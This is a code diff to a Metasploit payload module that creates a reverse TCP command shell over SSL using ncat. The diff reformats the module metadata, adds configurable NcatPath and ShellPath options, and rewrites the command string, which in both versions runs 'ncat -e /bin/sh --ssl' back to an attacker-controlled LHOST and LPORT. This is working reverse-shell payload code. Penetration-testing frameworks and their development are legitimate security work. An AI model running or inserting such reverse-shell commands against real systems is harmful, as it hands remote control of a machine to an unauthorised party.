@@ -13,22 +13,28 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Unix Command Shell, Reverse TCP (via ncat)',
-      'Description' => 'Creates an interactive shell via ncat, utilizing ssl mode',
-      'Author'      => 'C_Sto',
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'unix',
-      'Arch'        => ARCH_CMD,
-      'Handler'     => Msf::Handler::ReverseTcpSsl,
-      'Session'     => Msf::Sessions::CommandShell,
-      'PayloadType' => 'cmd',
-      'RequiredCmd' => 'ncat',
-      'Payload'     =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+     'Name'        => 'Unix Command Shell, Reverse TCP (via ncat)',
+     'Description' => 'Creates an interactive shell via ncat, utilizing ssl mode',
+     'Author'      => 'C_Sto',
+     'License'     => MSF_LICENSE,
+     'Platform'    => 'unix',
+     'Arch'        => ARCH_CMD,
+     'Handler'     => Msf::Handler::ReverseTcpSsl,
+     'Session'     => Msf::Sessions::CommandShell,
+     'PayloadType' => 'cmd',
+     'RequiredCmd' => 'ncat',
+     'Payload'     =>
+       {
+         'Offsets' => { },
+         'Payload' => ''
+       }
+    ))
+    register_advanced_options(
+      [
+        OptString.new('NcatPath', [true, 'The path to the NCat executable', 'ncat']),
+        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
+      ]
+    )
   end
 
   #
@@ -42,6 +48,6 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "ncat -e /bin/sh --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
+    "#{datastore['NcatPath']} -e #{datastore['ShellPath']} --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
   end
 end
